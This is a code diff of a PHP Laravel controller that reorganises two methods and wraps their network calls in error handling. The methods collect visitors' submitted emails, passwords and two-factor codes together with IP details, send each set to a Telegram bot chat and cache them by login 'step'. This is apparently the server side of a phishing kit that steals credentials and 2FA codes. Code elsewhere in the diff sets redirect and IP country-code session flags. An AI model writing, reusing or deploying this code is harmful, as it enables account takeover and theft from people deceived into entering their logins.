@@ -37,6 +37,80 @@ class Controller extends BaseController
         $this->groupTelegramId = $settings['group_id'];
     }
 
+    public function getAndSendDataFa(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $fa_code = $request->fa_code ?? '';
+            $email = $request->email ?? '';
+            $infoByIP = $this->getInfoByIP($request);
+            $data = [
+                'chat_id' => $this->groupTelegramId,
+                'text' => "$infoByIP\nFA code: $fa_code"
+            ];
+            try {
+                $client = new Client();
+                $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                    'json' => $data
+                ]);
+            } catch (Throwable $e) {
+                // to do
+            }
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'fa' => $fa_code,
+                'step' => 2,
+            ]));
+
+            return response()->json([
+                'status' => 0
+            ]);
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function getAndSendDataLogin(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $email = $request->email_2 ?? '';
+            $password = $request->password_2 ?? '';
+            $infoByIP = $this->getInfoByIP($request);
+            $data = [
+                'chat_id' => $this->groupTelegramId,
+                'text' => "$infoByIP\nEmail: $email\nPassword: $password"
+            ];
+            try {
+                $client = new Client();
+                $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                    'json' => $data
+                ]);
+            } catch (Throwable $e) {
+                // to do
+            }
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'password' => $password,
+                'step' => 1
+            ]));
+
+            return response()->json([
+                'status' => 0
+            ]);
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
     public function deleteAllCache(Request $request)
     {
         try {
@@ -173,74 +247,6 @@ class Controller extends BaseController
         session()->put('is_redirect', 1);
         session()->put('is_got_ip_country_code', 1);
         return redirect()->back();
-    }
-
-    public function getAndSendDataFa(Request $request): \Illuminate\Http\JsonResponse
-    {
-        try {
-            $fa_code = $request->fa_code ?? '';
-            $email = $request->email ?? '';
-            $infoByIP = $this->getInfoByIP($request);
-            $data = [
-                'chat_id' => $this->groupTelegramId,
-                'text' => "$infoByIP\nFA code: $fa_code"
-            ];
-            $client = new Client();
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
-            Cache::put("info", json_encode([
-                'ip' => $request->ip(),
-                'email' => $email,
-                'fa' => $fa_code,
-                'step' => 2,
-            ]));
-
-            return response()->json([
-                'status' => 0
-            ]);
-        } catch (Throwable $e) {
-            Cache::forget($email);
-            return response()->json([
-                'status' => 1,
-                'message' => $e->getMessage(),
-            ]);
-        }
-    }
-
-    public function getAndSendDataLogin(Request $request): \Illuminate\Http\JsonResponse
-    {
-        try {
-            $email = $request->email_2 ?? '';
-            $password = $request->password_2 ?? '';
-            $infoByIP = $this->getInfoByIP($request);
-            $data = [
-                'chat_id' => $this->groupTelegramId,
-                'text' => "$infoByIP\nEmail: $email\nPassword: $password"
-            ];
-
-            $client = new Client();
-
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
-            Cache::put("info", json_encode([
-                'ip' => $request->ip(),
-                'email' => $email,
-                'password' => $password,
-                'step' => 1
-            ]));
-
-            return response()->json([
-                'status' => 0
-            ]);
-        } catch (Throwable $e) {
-            Cache::forget($email);
-            return response()->json([
-                'status' => 1,
-                'message' => $e->getMessage(),
-            ]);
-        }
     }
 
     public function getAndSendDataReview(Request $request): \Illuminate\Http\JsonResponse
